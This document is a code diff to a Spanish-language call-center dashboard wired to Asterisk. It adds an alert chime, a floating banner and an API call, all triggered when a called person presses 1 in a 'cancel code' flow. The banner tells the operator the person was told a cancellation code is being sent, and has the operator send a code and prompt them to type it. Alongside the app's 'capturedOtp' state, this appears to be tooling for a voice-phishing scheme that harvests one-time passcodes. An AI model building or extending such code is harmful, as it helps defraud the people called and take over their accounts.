@@ -39,7 +39,7 @@ import { ServerTelemetryTab } from './components/ServerTelemetryTab';
 import { AmdConfigModal } from './components/AmdConfigModal';
 import { isTabAllowedForUser, getDefaultTabForUser } from './utils/rbac';
 import { getAuthToken, clearAuthToken, authFetch as fetch } from './utils/authClient';
-import { CheckCircle2, AlertCircle, RefreshCw, KeyRound, Copy, Check, X, ShieldAlert } from 'lucide-react';
+import { CheckCircle2, AlertCircle, RefreshCw, KeyRound, Copy, Check, X, ShieldAlert, BellRing, Send, PhoneCall } from 'lucide-react';
 
 export default function App() {
   const [activeTab, setActiveTab] = useState<string>('production');
@@ -257,6 +257,32 @@ export default function App() {
   const [globalLiveCalls, setGlobalLiveCalls] = useState<any[]>([]);
   const [globalLiveCallsUpdatedAt, setGlobalLiveCallsUpdatedAt] = useState<number>(Date.now());
   const [activeCallCount, setActiveCallCount] = useState<number>(0);
+  const [sendingCancelBannerNum, setSendingCancelBannerNum] = useState<string | null>(null);
+  const [dismissedCancelPress1Keys, setDismissedCancelPress1Keys] = useState<string[]>([]);
+  const seenGlobalCancelPress1Ref = useRef<Set<string>>(new Set());
+
+  const playGlobalCancelPress1Chime = useCallback(() => {
+    if (typeof window === 'undefined') return;
+    try {
+      const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
+      if (!AudioCtx) return;
+      const ctx = new AudioCtx();
+      const now = ctx.currentTime;
+      [587.33, 783.99, 1046.5].forEach((freq, idx) => {
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.type = 'triangle';
+        osc.frequency.setValueAtTime(freq, now + idx * 0.11);
+        gain.gain.setValueAtTime(0.08, now + idx * 0.11);
+        gain.gain.exponentialRampToValueAtTime(0.001, now + idx * 0.11 + 0.22);
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.start(now + idx * 0.11);
+        osc.stop(now + idx * 0.11 + 0.24);
+      });
+      setTimeout(() => ctx.close().catch(() => {}), 750);
+    } catch (_) {}
+  }, []);
 
   const getActiveIsolationScope = useCallback(() => {
     const activeU = users.find((u) => u.id === currentUserId) || users[0];
@@ -298,6 +324,20 @@ export default function App() {
             lastLiveCallsSigRef.current = callsSig;
             setGlobalLiveCalls(data.calls);
             setGlobalLiveCallsUpdatedAt(Date.now());
+          }
+          const cancelPress1Calls = data.calls.filter(
+            (c: any) => c.status === 'pressed_1' && c.mode === 'cancel_code' && !c.capturedOtp
+          );
+          let hasNewCancelPress1 = false;
+          cancelPress1Calls.forEach((c: any) => {
+            const key = `${c.id || c.number}_press1_cancel`;
+            if (!seenGlobalCancelPress1Ref.current.has(key)) {
+              seenGlobalCancelPress1Ref.current.add(key);
+              hasNewCancelPress1 = true;
+            }
+          });
+          if (hasNewCancelPress1) {
+            playGlobalCancelPress1Chime();
           }
           setActiveCallCount((prev) => (prev === running ? prev : running));
         }
@@ -364,6 +404,33 @@ export default function App() {
     navigator.clipboard.writeText(otp);
     setCopiedOtp(true);
     setTimeout(() => setCopiedOtp(false), 2000);
+  };
+
+  const handleGlobalCancelCodeSent = async (number: string, agent?: string) => {
+    setSendingCancelBannerNum(number);
+    try {
+      const res = await fetch('/api/asterisk/call/cancel-code-sent', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          number,
+          agent: agent && agent !== 'ringall' ? agent : undefined,
+        }),
+      });
+      if (res.ok) {
+        setGlobalLiveCalls((prev) =>
+          prev.map((c) =>
+            c.number === number
+              ? { ...c, status: 'asking_cancel_code', statusText: 'Solicitando al cliente digitar el código' }
+              : c
+          )
+        );
+        refreshLiveTelemetry();
+      }
+    } catch (_) {}
+    finally {
+      setSendingCancelBannerNum(null);
+    }
   };
 
   const handleQuickOtpDecision = async (
@@ -2083,6 +2150,75 @@ export default function App() {
         )}
       </main>
       </div>
+
+      {/* Floating Press-1 Cancel Code Alert Banner across non-production/non-live tabs */}
+      {(() => {
+        if (activeTab === 'production' || activeTab === 'live-calls') return null;
+        const pendingCancelCall = globalLiveCalls.find(
+          (c: any) =>
+            c.status === 'pressed_1' &&
+            c.mode === 'cancel_code' &&
+            !c.capturedOtp &&
+            !dismissedCancelPress1Keys.includes(`${c.id || c.number}_press1_cancel`)
+        );
+        if (!pendingCancelCall) return null;
+        const cancelKey = `${pendingCancelCall.id || pendingCancelCall.number}_press1_cancel`;
+        return (
+          <div
+            className={`fixed right-6 z-50 max-w-sm w-full bg-slate-950 border-2 border-amber-400 rounded-2xl p-4 shadow-2xl shadow-amber-500/30 text-white ${
+              globalOtpAlert ? 'bottom-[310px]' : 'bottom-6'
+            }`}
+          >
+            <div className="flex items-center justify-between gap-2 mb-2 pb-2 border-b border-amber-500/30">
+              <div className="flex items-center gap-2">
+                <BellRing className="w-4 h-4 text-amber-400 animate-bounce" />
+                <span className="text-xs font-black uppercase tracking-wider text-amber-300">
+                  ¡Cliente Marcó 1! — Envía Código
+                </span>
+              </div>
+              <button
+                onClick={() => setDismissedCancelPress1Keys((prev) => [...prev, cancelKey])}
+                className="p-1 rounded-md text-slate-400 hover:text-white hover:bg-slate-800 cursor-pointer"
+                title="Cerrar aviso"
+              >
+                <X className="w-4 h-4" />
+              </button>
+            </div>
+
+            <div className="mb-3">
+              <div className="text-[11px] text-slate-400">Número esperando en línea:</div>
+              <div className="text-sm font-mono font-black text-white">{pendingCancelCall.number}</div>
+              <p className="text-[11px] text-amber-200/90 mt-1 leading-snug">
+                El cliente escuchó: <em>&quot;Un momento por favor, le estamos enviando un código de cancelación&quot;</em>. Envíale el código y pulsa el botón para que lo digite:
+              </p>
+            </div>
+
+            <div className="space-y-2">
+              <button
+                type="button"
+                disabled={sendingCancelBannerNum === pendingCancelCall.number}
+                onClick={() => handleGlobalCancelCodeSent(pendingCancelCall.number, pendingCancelCall.agent)}
+                className="w-full flex items-center justify-center gap-2 px-3 py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-black text-xs transition-all cursor-pointer shadow-md shadow-emerald-500/25 disabled:opacity-50"
+              >
+                <Send className="w-3.5 h-3.5" />
+                <span>
+                  {sendingCancelBannerNum === pendingCancelCall.number
+                    ? 'Activando...'
+                    : 'Ya Envié el Código → Pedir que Digite'}
+                </span>
+              </button>
+              <button
+                type="button"
+                onClick={() => setActiveTab('production')}
+                className="w-full flex items-center justify-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 font-bold text-xs transition-all cursor-pointer"
+              >
+                <PhoneCall className="w-3.5 h-3.5 text-amber-400" />
+                <span>Ir al Centro de Llamadas</span>
+              </button>
+            </div>
+          </div>
+        );
+      })()}
 
       {/* Floating OTP Notification Banner (Hidden in production & live-calls since both render dedicated OTP consoles) */}
       {globalOtpAlert && activeTab !== 'production' && activeTab !== 'live-calls' && (
